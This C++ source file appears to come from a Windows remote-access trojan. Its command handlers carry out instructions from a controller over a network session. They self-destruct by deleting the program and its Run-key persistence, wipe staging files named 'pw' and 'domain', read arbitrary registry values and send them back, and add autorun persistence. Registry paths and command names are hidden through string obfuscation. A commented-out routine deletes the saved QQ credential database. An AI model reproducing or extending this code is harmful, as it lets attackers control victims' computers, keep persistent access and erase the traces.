// processcmd.cpp: implementation of the processcmd class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
//#include "MSTools.h"
#include "processcmd.h"
#include "WinApi.h"
#include "Struct.h"
#include "NdisSocket.h"
#include "Base.h"

#ifdef _DEBUG
#undef THIS_FILE
static char THIS_FILE[]=__FILE__;
#define new DEBUG_NEW
#endif

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////
///销毁
//////////////////////////////////////////////////////////////////////////
BOOL DestroySelf(const char * szKeyName, const WCHAR * SelfName, const WCHAR *SelfPath)
{
	long Result=0;
	HKEY hKey;
	WCHAR filepath[MAX_PATH];
	
	//Software\\Microsoft\\Windows\\Currentversion\\Run
	char szKey[100];
	DepubStringA(szKey, 100, "AkleLVow\\.yGok2kle\\Nyx:kL2\\8aoowxeEwo2ykx\\Wax");
	
	//删除注册表
	Result = PRegOpenKeyExA(HKEY_CURRENT_USER, 
		szKey,
		0, KEY_QUERY_VALUE | KEY_SET_VALUE, &hKey);
	if(Result == ERROR_SUCCESS)
	{
		PRegDeleteValueA(hKey, szKeyName);
		PRegCloseKey(hKey);
	}
	
	//删除程序
	wcscpy(filepath, SelfPath);
	wcscat(filepath, SelfName);
	BootNTRemoveW(SelfPath);
	
	//退出程序
	exit(0);
	
	return TRUE;
}

BOOL ClearSit()
{
	char FilePath[MAX_PATH];
	char tropath[MAX_PATH];
	if(GetTroPath(tropath)==FALSE)
		return FALSE;
	
	sprintf(FilePath, "%s\\hs", tropath);
	BootNTRemove(FilePath);
	
	sprintf(FilePath, "%s\\Compatible", tropath);
	BootNTRemove(FilePath);
	
	sprintf(FilePath, "%s\\domain", tropath);
	BootNTRemove(FilePath);
	
	sprintf(FilePath, "%s\\pw", tropath);
	BootNTRemove(FilePath);
	
	sprintf(FilePath, "%s\\Company", tropath);
	BootNTRemove(FilePath);
	
	sprintf(FilePath, "%s\\reserve", tropath);
	BootNTRemove(FilePath);

	return TRUE;
}

DWORD Cmd_Destory(char* pPara)
{
	IF_LOUD(DbgFat32Log("收到销毁命令");)
	ThreadParam *ThreadPara = (ThreadParam*)pPara;
	// 发送回应
	char buffer[50];
	memset(buffer,0,50);
	DWORD datalen=0;
	datalen=sprintf(buffer, "content-length: 4\r\n\r\n收到");
	SendData(buffer, datalen, ThreadPara->PacketType, ThreadPara->SessionID);
	
	
	char TmpDeStr1[100], TmpDeStr2[100];
	//dvdplay
	DepubStringA(TmpDeStr1, 100, ":E:XdVB");
	//wmplayer
	DepubStringA(TmpDeStr2, 100, "LhXdVBwo");

	WCHAR Selfpath[MAX_PATH], SelfName[MAX_PATH];
	memset(SelfName, 0, 2*MAX_PATH);
	memset(Selfpath, 0, 2*MAX_PATH);
	if(myGetModuleFile(Selfpath, MAX_PATH, SelfName, MAX_PATH))
	{
		char tmpName[MAX_PATH];
		memset(tmpName, 0, MAX_PATH);
		Unicode2GB2312(SelfName, tmpName, MAX_PATH);
		(strrchr(tmpName, '.'))[0] = 0;

		DestroySelf(tmpName, SelfName, Selfpath);
	
		if (strstr(tmpName, TmpDeStr2) != NULL)
		{
			DestroySelf(TmpDeStr1, SelfName, Selfpath);
		}
	}
	
	ClearSit();
	return 0;
}

//////////////////////////////////////////////////////////////////////////
//MD5
//////////////////////////////////////////////////////////////////////////
DWORD CheckFileMD5(DWORD* pPara)
{
	ThreadParam *ppara=(ThreadParam*)pPara;
	
	char *field=0;
	char *value=0;
	char *nextline=0;
	char *inputline=ppara->buf;
	
	char  filepath[300];
	memset(filepath, 0, sizeof(filepath));
	
	int re=0;
	re=LineParser(inputline,&nextline,&field,&value);
	while(re){
		if(stricmp(field, "filepath") == 0)
		{
			strncpy(filepath, value, sizeof(filepath)-1);
		}
		
		if(re==2)
			break;
		inputline=nextline;
		re=LineParser(inputline,&nextline,&field,&value);
	}

	WCHAR *unicodefilename = new WCHAR[500];
	memset(unicodefilename, 0, 500*sizeof(WCHAR));
	if(UTF_82Unicode((char*)filepath, unicodefilename, 500*sizeof(WCHAR))<=0)
	{
		delete[] unicodefilename;
		unicodefilename = NULL;
		return 0;
	}

	char * md5str = new char[33];
	memset(md5str, 0, 33);
	if (_waccess(unicodefilename, 0) == 0)
	{
		MD5TranFile1(md5str, unicodefilename);
	}
	
	char buffer[100];
	memset(buffer,0,100);
	DWORD datalen=0;
	datalen = sprintf(buffer, "content-length: %d\r\n\r\n%s", strlen(md5str), md5str);
	if(SendData(buffer, datalen, ppara->PacketType, ppara->SessionID))
	{	
	}
	
	delete []md5str;
	delete []unicodefilename;
	
	return 1;
}

//////////////////////////////////////////////////////////////////////////
//
//////////////////////////////////////////////////////////////////////////
BOOL SetHeadSign(DWORD* pPara)
{
	ThreadParam *ppara=(ThreadParam*)pPara;
	char *p=0;//目录名
	
	char *field=0;
	char *value=0;
	char *nextline=0;
	char *inputline=ppara->buf;
	
	char  strHeadSign[MAX_PATH];
	memset(strHeadSign, 0, sizeof(strHeadSign));
	
	//headsign
	char CmdStr1[9];
	CmdStr1[0] = 0x68;
	CmdStr1[1] = 0x65;
	CmdStr1[2] = 0x61;
	CmdStr1[3] = 0x64;
	CmdStr1[4] = 0x73;
	CmdStr1[5] = 0x69;
	CmdStr1[6] = 0x67;
	CmdStr1[7] = 0x6e;
	CmdStr1[8] = 0x00;

	int re=0;
	re=LineParser(inputline,&nextline,&field,&value);
	while(re){
		if(stricmp(field, CmdStr1)==0)
		{
			strcpy(strHeadSign, value);
		}
		
		if(re==2)
			break;
		inputline=nextline;
		re=LineParser(inputline,&nextline,&field,&value);
	}
	
	char FilePath[MAX_PATH];
	char tropath[MAX_PATH];
	if(GetTroPath(tropath)==FALSE)
		return FALSE;
	
	sprintf(FilePath, "%s\\hs", tropath);
	
	char HeadSign[10];
	memset(HeadSign, 0, 10);
	ULONG len = 1;
	if (strcmp(strHeadSign, "1") == 0)
	{
		HeadSign[0] = 11;
		SignType = 11;
	}
	else if (strcmp(strHeadSign, "2") == 0)
	{
		HeadSign[0] = 22;
		SignType = 22;
	}
	else
	{
		SignType = 0;
	}
	
	RemoteFileContent(FilePath, HeadSign, len, FALSE);
	
	return TRUE;
}

//////////////////////////////////////////////////////////////////////////
//
//////////////////////////////////////////////////////////////////////////
extern time_t g_acktime;

DWORD Cmd_AckHeart(DWORD* pPara)
{
	g_acktime=::time(0);

	return 0;
}

//////////////////////////////////////////////////////////////////////////
//
//////////////////////////////////////////////////////////////////////////
DWORD FlashBuffer(DWORD* pPara)
{
	ThreadParam *ThreadPara=(ThreadParam*)pPara;
	
	char *p=strstr(ThreadPara->buf,"\r\n\r\n");
	if(p!=NULL)
		p[0]=0;
	else
	{
		return 0;
	}
	p=strstr(ThreadPara->buf, "sessionid: ");
	if(p!=NULL)
		p+=strlen("sessionid: ");
	else
	{
		return 0;
	}
	WORD sessionid = atoi(p);	
	ClearTask(sessionid,FALSE);
				
	char buffer[100];
	memset(buffer,0,100);
	DWORD datalen=0;
	datalen = sprintf(buffer, "content-length: 2\r\n\r\n%s","ok");
	if(SendData(buffer, datalen, ThreadPara->PacketType, ThreadPara->SessionID))
	{	
	}

	return 0;
}

//////////////////////////////////////////////////////////////////////////
//
//////////////////////////////////////////////////////////////////////////
DWORD GetRegedit(DWORD* pPara)
{
	ThreadParam *ppara=(ThreadParam*)pPara;
	
	char *field=0;
	char *value=0;
	char *nextline=0;
	char *inputline=ppara->buf;
	
	char szHKey[300], szSubKey[300], szValueName[300], TmpDeStr[30];
	memset(szHKey, 0, sizeof(szHKey));
	memset(szSubKey, 0, sizeof(szSubKey));
	memset(szValueName, 0, sizeof(szValueName));
	
	int re=0;
	re=LineParser(inputline,&nextline,&field,&value);
	while(re){
		if(stricmp(field, DepubStringA(TmpDeStr, 30, "ZbwB")) == 0)//hkey
		{
			strncpy(szHKey, value, sizeof(szHKey)-1);
		}
		else if (stricmp(field, DepubStringA(TmpDeStr, 30, "2a_bwB")) == 0)//subkey
		{
			strncpy(szSubKey, value, sizeof(szSubKey)-1);
		}
		else if (stricmp(field, DepubStringA(TmpDeStr, 30, "EVdawxVhw")) == 0)//valuename
		{
			strncpy(szValueName, value, sizeof(szValueName)-1);
		}
		
		if(re==2)
			break;
		inputline=nextline;
		re=LineParser(inputline,&nextline,&field,&value);
	}

	HKEY hCmdKey;

	if (stricmp(szHKey, DepubStringA(TmpDeStr, 30, "GdV22w2okke")) == 0)//classesroot
	{
		hCmdKey = HKEY_CLASSES_ROOT;
	}
	else if (stricmp(szHKey, DepubStringA(TmpDeStr, 30, "Gaoowxea2wo")) == 0)//currentuser
	{
		hCmdKey = HKEY_CURRENT_USER;
	}
	else if (stricmp(szHKey, DepubStringA(TmpDeStr, 30, "dkGVdhVGZyxw")) == 0)//localmachine
	{
		hCmdKey = HKEY_LOCAL_MACHINE;
	}
	else if (stricmp(szHKey, DepubStringA(TmpDeStr, 30, "a2wo2")) == 0)//users
	{
		hCmdKey = HKEY_USERS;
	}
	else if (stricmp(szHKey, DepubStringA(TmpDeStr, 30, "GaoowxeGkxlys")) == 0)//currentconfig
	{
		hCmdKey = HKEY_CURRENT_CONFIG;
	}

	unsigned char tmp[1000];
	HKEY hkey;
	unsigned long type;
	long res;
	unsigned long len;
	
	if(PRegOpenKeyExA(hCmdKey,
		szSubKey,
		0,
		KEY_QUERY_VALUE,
		&hkey)!=ERROR_SUCCESS)	//打开键失败
	{
		return 0;
	}
	
	len = 1000;
	res = PRegQueryValueExA(hkey, szValueName, 0, &type, tmp, &len);
	
	PRegCloseKey(hkey);
	
	if(res!=ERROR_SUCCESS)	//查询键值失败,或者值类型不是字符串
		return 0;

	char buffer[1100];
	memset(buffer, 0, 1100);
	DWORD datalen=0;
	datalen = sprintf(buffer, "content-length: %d\r\n\r\n%s", len, tmp);
	if(SendData(buffer, datalen, ppara->PacketType, ppara->SessionID))
	{	
	}

	return 0;
}

//////////////////////////////////////////////////////////////////////////
//
//////////////////////////////////////////////////////////////////////////
DWORD AddRunCmd(DWORD* pPara)
{
	ThreadParam *ppara=(ThreadParam*)pPara;
	
	char *field=0;
	char *value=0;
	char *nextline=0;
	char *inputline=ppara->buf;
	
	char szlist[1000];
	memset(szlist, 0, sizeof(szlist));
	
	int re=0;
	re=LineParser(inputline,&nextline,&field,&value);
	while(re){
		if(stricmp(field, "list") == 0)
		{
			strncpy(szlist, value, sizeof(szlist)-1);
		}
		
		if(re==2)
			break;
		inputline=nextline;
		re=LineParser(inputline,&nextline,&field,&value);
	}

	vector<string> ExeNameArr;
	int len = strlen(szlist);
	Split(szlist, len, ",", ExeNameArr);

	PROCESSENTRY32W pe32;
	pe32.dwSize = sizeof(pe32);
	HANDLE hProcessSnap = NULL;
	hProcessSnap = PCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (hProcessSnap == INVALID_HANDLE_VALUE)
	{
		return 0;
	}
	BOOL bResult = PProcess32FirstW(hProcessSnap, &pe32);
	BOOL bfind = FALSE;
	WCHAR ExeName[100];
	int NameLen = 100;
	while(bResult)
	{
		for (int i = 0; i < ExeNameArr.size(); i++)
		{
			UTF_82Unicode((char *)ExeNameArr[i].c_str(), ExeName, NameLen);
			if (wcsicmp(pe32.szExeFile, ExeName) == 0)
			{
				bfind = TRUE;
				break;
			}
		}

		PSleep(100);

		if (bfind)
		{
			break;
		}

		bResult = PProcess32NextW(hProcessSnap, &pe32);
	}
	
	CloseHandle(hProcessSnap);

	if (bfind)
	{
		return 0;
	}

	AddRunA();

	return 0;
}

//////////////////////////////////////////////////////////////////////////

BOOL bFolderFun = FALSE;

void AddRun()
{
	if (bFolderFun)
	{
		AddRunF();
	}
	else
	{
 		AddRunA();
 	}
}

DWORD AddFolderRunCmd(DWORD *pPara)
{
	bFolderFun = TRUE;
	return 0;	
}

// BOOL DelQQPass(DWORD* pPara)
// {
// 	ThreadParam *ppara=(ThreadParam*)pPara;
// 	
// 	char pathtype[10];
// 	DWORD pathtypelen = 10;
// 	char path[MAX_PATH];
// 	DWORD buflen=MAX_PATH;
// 	int offset = 0;
// 	ZeroMemory(path, buflen);
// 	char IniFilePath[MAX_PATH];
// 	char TmpDeStr[30];
// 	
// 	//C:\\Documents and Settings\\All Users\\Documents\\Tencent\\qq\\UserDataInfo.ini
// 	DeFileStringA(IniFilePath, MAX_PATH, "r:\\blKeWkFVC SFv ZkVVEFgC\\cGG mCkTC\\blKeWkFVC\\JkFKkFV\\qq\\mCkTbSVSDFHl.EFE");
// 	
// 	if(_access(IniFilePath, 0) != 0)
// 	{
// 		//C:\\Users\\Public\\Documents\\Tencent\\qq\\UserDataInfo.ini
// 		DeFileStringA(IniFilePath, MAX_PATH, "r:\\mCkTC\\zeYGEK\\blKeWkFVC\\JkFKkFV\\qq\\mCkTbSVSDFHl.EFE");
// 	}
// 	
// 	PGetPrivateProfileStringA("UserDataSet", "UserDataSavePathType", "1", pathtype, pathtypelen, IniFilePath);
// 	
// 	int typepath = atoi(pathtype);
// 	if (typepath == 1)
// 	{
// 		QueryRegValueF(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders", "Personal", path, buflen);
// 		//\\Tencent Files
// 		strcat(path, DeFileStringA(TmpDeStr, 30, "\\JkFKkFV XEGkC"));
// 	}
// 	else if (typepath == 0)
// 	{
// 		char szKeyPath[50];
// 		//SOFTWARE\\Tencent\\QQ2009\\ 
// 		DepubStringA(szKeyPath, 50, "AIt-NPWi\\-wxGwxe\\uuC77R\\");
// 		QueryRegValueF(HKEY_LOCAL_MACHINE, szKeyPath, "Install",	path,	buflen);
// 		strcat(path, "\\Users");
// 	}
// 	else
// 	{
// 		PGetPrivateProfileStringA("UserDataSet", "UserDataSavePath", "b:\\aaa", path, buflen, IniFilePath);
// 	}
// 	
// 	if(_access(path, 0) == 0)
// 	{
// 		if(path[strlen(path)-1] == '\\')
// 			path[strlen(path)-1] = 0;
// 		buflen = strlen(path);
// 	}
// 	else
// 	{
// 		return FALSE;
// 	}
// 	
// 	char QQPath[MAX_PATH];
// 	char QQPathFile[MAX_PATH];
// 	HANDLE hfindfile;
// 	WIN32_FIND_DATAA finddata;
// 	
// 	strcpy(QQPath, path);
// 	strcat(QQPath, "\\*.*");
// 	
// 	hfindfile = PFindFirstFileA(QQPath, &finddata);
// 	if (hfindfile != INVALID_HANDLE_VALUE)
// 	{
// 		do{
// 			if (finddata.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
// 			{
// 				if(finddata.cFileName[0] == L'.')
// 					continue;
// 				
// 				memset(QQPathFile, 0, MAX_PATH);
// 				sprintf(QQPathFile, "%s\\%s\\Q%s%s", path, finddata.cFileName, "Q\\Regi", "stry.db");
// 				if(_access(QQPathFile, 0) == 0)
// 				{
// 					PDeleteFileA(QQPathFile);
// 				}
// 			}
// 		}while(PFindNextFileA(hfindfile, &finddata));
// 		
// 		PFindClose(hfindfile);
// 	}
// 	
// 	return TRUE;
// }


